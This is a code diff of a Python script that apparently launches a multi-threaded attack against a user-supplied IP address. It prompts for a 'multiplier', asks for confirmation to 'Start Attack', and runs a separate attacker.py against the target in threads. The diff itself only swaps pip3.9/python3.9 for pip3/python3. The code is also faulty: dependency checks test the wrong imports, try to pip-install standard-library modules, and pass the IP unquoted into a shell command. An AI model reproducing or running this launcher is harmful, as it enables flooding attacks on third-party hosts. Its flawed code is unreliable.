@@ -6,25 +6,25 @@ try:
   import Colorama
 except:
   print("Installing Dependency: Colorama")
-  os.system("pip3.9 install colorama 1>/dev/null")
+  os.system("pip3 install colorama 1>/dev/null")
 
 try:
   import time
 except:
   print("Installing Dependency: Time")
-  os.system("pip3.9 install time 1>/dev/null")
+  os.system("pip3 install time 1>/dev/null")
 
 try:
   import time
 except:
   print("Installing Dependency: Signal")
-  os.system("pip3.9 install signal 1>/dev/null")
+  os.system("pip3 install signal 1>/dev/null")
 
 try:
   import time
 except:
   print("Installing Dependency: Readchar")
-  os.system("pip3.9 install readchar 1>/dev/null")
+  os.system("pip3 install readchar 1>/dev/null")
 
 # --------------------------------------------
 import threading
@@ -54,7 +54,7 @@ count = input(Fore.CYAN+"  Multiplier(1-50): "+Fore.WHITE)
 
 def attack():
   print("  Starting Thread!")
-  os.system("python3.9 attacker.py "+ip)
+  os.system("python3 attacker.py "+ip)
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 
 yesno = input(Fore.RED+"  Start Attack On "+ip+" With "+count+"x Multiplier"+"? Y/N: ")
